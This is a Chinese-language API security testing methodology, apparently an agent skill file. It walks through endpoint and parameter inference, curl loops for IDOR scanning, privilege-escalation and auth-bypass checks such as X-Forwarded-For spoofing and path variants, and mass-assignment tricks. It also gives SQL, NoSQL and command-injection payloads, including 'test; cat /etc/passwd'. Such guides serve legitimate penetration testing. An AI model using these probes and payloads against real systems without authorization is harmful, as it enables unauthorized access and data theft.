# API 测试方法论 — 语义分析与智能 Fuzz

> 融合自 api-fuzz 技能。核心思想：通过端点语义推断参数和业务逻辑，精准构造 payload，而非盲目跑字典。

---

## 1. RESTful CRUD 推断

```
发现: GET /api/users/123
推断:
  GET    /api/users          → 列出所有用户（信息泄露）
  GET    /api/users/1        → 遍历用户 ID（IDOR）
  POST   /api/users          → 创建用户（未授权注册）
  PUT    /api/users/123      → 修改用户（越权修改）
  DELETE /api/users/123      → 删除用户（越权删除）
  PATCH  /api/users/123      → 部分更新（Mass Assignment）
```

## 2. 路径语义 → 参数推断

| 端点模式 | 推断的参数 | 测试方向 |
|----------|-----------|----------|
| `/api/users/{id}` | `id` (int) | IDOR: 遍历 1-1000 |
| `/api/search?q=` | `q` (string) | SQL 注入、XSS |
| `/api/upload` | `file` (multipart) | 文件上传绕过 |
| `/api/export?type=` | `type`, `format` | 路径穿越、SSRF |
| `/api/config` | `key`, `value` | 配置篡改 |
| `/api/execute`, `/api/run` | `cmd`, `command`, `script` | 命令注入 |
| `/api/proxy?url=` | `url`, `target`, `redirect` | SSRF |
| `/api/template`, `/api/render` | `template`, `content` | SSTI |
| `/api/login` | `username`, `password` | 暴力破解、SQL 注入 |
| `/api/reset-password` | `email`, `token`, `code` | 逻辑绕过 |
| `/api/pay`, `/api/order` | `amount`, `price`, `quantity` | 金额篡改 |

## 3. 命名规律扩展

```
发现: /api/v1/user/info
扩展尝试:
  /api/v1/user/list         # 用户列表
  /api/v1/user/detail       # 用户详情
  /api/v1/user/update       # 修改资料
  /api/v1/user/delete       # 删除用户
  /api/v1/admin/user/list   # 管理员接口
  /api/v2/user/info         # 旧版本
  /api/internal/user/info   # 内部接口
```

## 4. 参数发现

### 4.1 常见参数名字典（按业务场景）

**身份类**: `id`, `uid`, `user_id`, `userId`, `account`, `username`, `email`, `phone`
**分页类**: `page`, `pageNum`, `pageSize`, `limit`, `offset`, `size`, `start`
**查询类**: `q`, `query`, `search`, `keyword`, `filter`, `sort`, `order`, `orderBy`
**文件类**: `file`, `filename`, `path`, `url`, `filePath`, `dir`, `attachment`
**认证类**: `token`, `auth`, `session`, `key`, `apiKey`, `access_token`, `refresh_token`
**操作类**: `action`, `type`, `method`, `cmd`, `op`, `status`, `role`

### 4.2 参数存在性探测

```bash
# 方法 1: 逐一添加参数观察响应变化
BASE="http://target.com/api/users"
# 基线响应
curl -s "$BASE" | wc -c
# 逐一测试参数
for param in id uid page limit search q role status; do
    len=$(curl -s "$BASE?$param=1" | wc -c)
    echo "$param → $len bytes"
done
# 长度/状态码变化 = 参数被接受
```

```bash
# 方法 2: POST JSON body 参数探测
curl -s -X POST "$BASE" \
  -H "Content-Type: application/json" \
  -d '{"id":1}' | head -5
# 观察报错信息——很多框架会提示缺少哪些参数
# "missing required field: username" → 参数名泄露
```

### 4.3 Content-Type 变体测试

```bash
# 同一端点换不同 Content-Type 可能走不同处理逻辑
curl -X POST "$BASE" -H "Content-Type: application/json" -d '{"id":1}'
curl -X POST "$BASE" -H "Content-Type: application/xml" -d '<id>1</id>'
curl -X POST "$BASE" -H "Content-Type: application/x-www-form-urlencoded" -d 'id=1'
# XML 路径可能有 XXE，form 路径可能有不同的过滤规则
```

## 5. 智能 Fuzz 策略

对每个发现的参数，根据其语义选择 payload：

```
参数名含 id/num → IDOR 遍历 + SQL 注入
参数名含 url/path/file → SSRF + 路径穿越
参数名含 search/q/query → SQL 注入 + XSS
参数名含 template/content → SSTI
参数名含 cmd/exec/run → 命令注入
参数名含 redirect/return/next → 开放重定向
参数名含 amount/price/qty → 业务逻辑（负数、零、极大值）
```

→ 详细 payload 模板 → [api-fuzz-payloads.md](api-fuzz-payloads.md)

## 6. IDOR 批量验证

```bash
# 对数字 ID 端点做快速 IDOR 扫描
for i in $(seq 1 20); do
    resp=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" \
        "$BASE/api/users/$i" -H "Cookie: $COOKIE")
    echo "ID=$i → $resp"
done
# 不同 ID 都返回 200 且内容不同 → IDOR 确认
```

## 7. 权限边界测试

```bash
# 用普通用户 token 访问管理端点
curl -s "$BASE/api/admin/users" -H "Authorization: Bearer $USER_TOKEN"
# 200 → 垂直越权

# 去掉认证头
curl -s "$BASE/api/admin/users"
# 200 → 未授权访问

# 用 A 用户 token 访问 B 用户数据
curl -s "$BASE/api/users/OTHER_USER_ID" -H "Authorization: Bearer $A_TOKEN"
# 返回 B 的数据 → 水平越权
```

## 8. 响应分析

### 关键看点

- **错误信息** → 框架、数据库类型、内部路径泄露
- **多余字段** → API 返回了前端未展示的字段（password_hash、internal_ip、role）
- **调试信息** → `debug=true` 参数可能开启详细错误
- **响应时间差异** → 盲注/盲 SSRF 的判断依据
- **数据量异常** → `limit=-1` 或 `pageSize=99999` 导致全量数据泄露

### 响应模式对照

| 响应 | 含义 | 下一步 |
|------|------|--------|
| `{"error": "missing field: xxx"}` | 参数名泄露 | 补全参数重试 |
| `{"error": "invalid type"}` | 类型信息 | 尝试不同类型 |
| `{"data": [...], "total": 10000}` | 数据量大 | 尝试导出全部 |
| `500 + SQL stack trace` | SQL 注入入口 | → SQL 注入深度测试 |
| `200 但空数组` | 端点存在 | 换参数/方法重试 |

## 9. 405 → POST + 空 JSON 体

接口返回 405 时，改 POST 并带上 `Content-Type: application/json` + 空 JSON body `{}`：

```bash
# 原始 GET 返回 405
curl -s http://target/api/user/info
# → 405 Method Not Allowed

# 改 POST + 空 JSON（关键是 Content-Type + 空体一起带）
curl -s -X POST http://target/api/user/info \
  -H "Content-Type: application/json" \
  -d '{}'
# → 200 + 返回参数缺失提示（告诉你需要什么参数）

# 根据提示补全参数
curl -s -X POST http://target/api/user/info \
  -H "Content-Type: application/json" \
  -d '{"userId": 1}'
# → 200 + 用户信息
```

## 10. API 认证绕过技巧

```
# IP 白名单绕过
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1

# 路径绕过
/api/admin → 403
/api/Admin → 200？
/api/admin/ → 200？（trailing slash）
/api//admin → 200？（double slash）
/api/admin%20 → 200？（URL编码空格）
/api/admin;.js → 200？（Nginx/Tomcat 解析差异）

# 方法绕过
GET /api/admin → 403
POST /api/admin → 200？
OPTIONS /api/admin → 返回 Allow 头暴露可用方法
```

## 11. Mass Assignment / 批量赋值

注册/更新时添加额外字段：
```json
{"username": "test", "password": "pass", "role": "admin"}
{"username": "test", "password": "pass", "is_admin": true}
{"username": "test", "password": "pass", "balance": 999999}
```

## 12. 参数类型混淆

```
id=1        → id[]=1（数组）
id=1        → id={"$gt":0}（对象/NoSQL）
limit=10    → limit=999999（大量数据泄露）
page=1      → page=-1（负数）
```

## 13. 注入测试

```json
// SQL 注入
{"search": "' OR 1=1--"}
{"id": "1 UNION SELECT 1,2,3--"}

// NoSQL 注入（MongoDB）
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$regex": "admin.*"}}

// 命令注入
{"filename": "test; cat /etc/passwd"}
```

## 14. Vue/SPA Hash 路由

Vue 等前端框架使用 `#` 作为路由标记，`#` 后面的内容不会发送到服务器：

```bash
# Vue 应用的登录页
https://target/rental/#/login/

# 手动拼接管理接口
https://target/rental/#/admin/dashboard
https://target/rental/#/riskReport?transId=

# 实际 API 请求（需找到正确的前缀）
curl -s http://target/api/gw/rent/rebateBillSettlementList
```

### 前置路径发现

同一系统的 API 通常共享相同的前置路径。当在流量中发现一个完整的 API 路径（如 `/api/gw/rent/rebateBillSettlementList`），把这个前置路径（`/api/gw/rent/`）提取出来，和从 JS 中找到的其他短接口名拼接。

---

*API Testing Methodology v1.0 — Fused from api-fuzz skill*
